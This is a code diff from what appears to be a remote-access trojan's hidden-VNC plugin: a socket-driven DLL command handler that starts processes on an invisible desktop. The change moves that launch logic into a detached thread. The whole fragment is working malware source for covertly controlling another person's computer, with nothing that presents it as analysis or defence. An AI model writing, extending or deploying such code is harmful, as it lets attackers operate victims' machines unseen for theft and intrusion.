@@ -1685,37 +1685,39 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     }
                 }).detach();
             } else {
-                ensure_desktop();
-                if (!g_hHiddenDesktop) return;
+                thread([wRequestedPath]() {
+                    ensure_desktop();
+                    if (!g_hHiddenDesktop) return;
 
-                HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
-                if (g_hHiddenDesktop) {
-                    SetThreadDesktop(g_hHiddenDesktop);
-                }
+                    HDESK hCurrentDesktop = GetThreadDesktop(GetCurrentThreadId());
+                    if (g_hHiddenDesktop) {
+                        SetThreadDesktop(g_hHiddenDesktop);
+                    }
 
-                vector<wchar_t> cmdLine(wRequestedPath.begin(), wRequestedPath.end());
-                cmdLine.push_back(L'\0');
+                    vector<wchar_t> cmdLine(wRequestedPath.begin(), wRequestedPath.end());
+                    cmdLine.push_back(L'\0');
 
-                wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-                STARTUPINFOW si = { sizeof(si) };
-                si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-                si.dwFlags      = STARTF_USESHOWWINDOW;
-                si.wShowWindow  = SW_SHOW;
+                    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+                    STARTUPINFOW si = { sizeof(si) };
+                    si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+                    si.dwFlags      = STARTF_USESHOWWINDOW;
+                    si.wShowWindow  = SW_SHOW;
 
-                PROCESS_INFORMATION pi = { 0 };
-                if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                   CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-                    CloseHandle(pi.hProcess);
-                    CloseHandle(pi.hThread);
-                    request_full_frame(true);
-                    send_status("Process started on hidden desktop");
-                } else {
-                    send_error("Failed to start process. Error: " + to_string(GetLastError()));
-                }
+                    PROCESS_INFORMATION pi = { 0 };
+                    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                       CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
+                        request_full_frame(true);
+                        send_status("Process started on hidden desktop");
+                    } else {
+                        send_error("Failed to start process. Error: " + to_string(GetLastError()));
+                    }
 
-                if (hCurrentDesktop) {
-                    SetThreadDesktop(hCurrentDesktop);
-                }
+                    if (hCurrentDesktop) {
+                        SetThreadDesktop(hCurrentDesktop);
+                    }
+                }).detach();
             }
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
